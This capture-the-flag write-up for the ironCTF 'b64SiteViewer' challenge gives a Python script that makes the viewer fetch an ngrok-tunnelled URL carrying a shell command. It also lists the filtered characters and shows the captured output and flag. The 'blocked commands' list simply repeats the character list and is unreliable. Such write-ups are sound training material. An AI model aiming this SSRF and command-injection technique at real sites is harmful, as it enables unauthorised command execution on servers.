# b64SiteViewer

Solved by: @vicevirus

## Question:

Hey everyone, check out my new Base64 site viewer! The admin believes he's invincible.Do you have what it takes to outsmart him?
Flag Format: ironCTF{alphanumeric\_lowercase}

## Solutions:
- The goal is to run `/usr/local/bin/flag`

```python
import requests
import base64

url = 'https://b64siteviewer.1nf1n1ty.team/'

cmd = 'ls'
payload = {
    'url': f'http://0.tcp.ap.ngrok.io:port/?cmd={cmd}'
}

response = requests.post(url, data=payload)

b64_encoded_content = response.text.split("base64 version of the site:")[1].strip().split("\n")[0].strip("b'").strip("'")
decoded_content = base64.b64decode(b64_encoded_content).decode('utf-8')

print("Decoded content:\n", decoded_content)
```

These are the blocked characters: `['"', '$', "'", '.', '/', '`', '|']`

These are the blocked commands: `['"', '$', "'", '.', '/', '`', '|']`

Final:
```
head *

==> run.sh <==
#!/bin/bash
export flag="ironCTF{y0u4r3r0ck1n6k33ph4ck1n6}"
cd /home/user
python -m app
```
![ironctf-4](ironctf-4.jpg)

**Flag:** `ironCTF{y0u4r3r0ck1n6k33ph4ck1n6}`


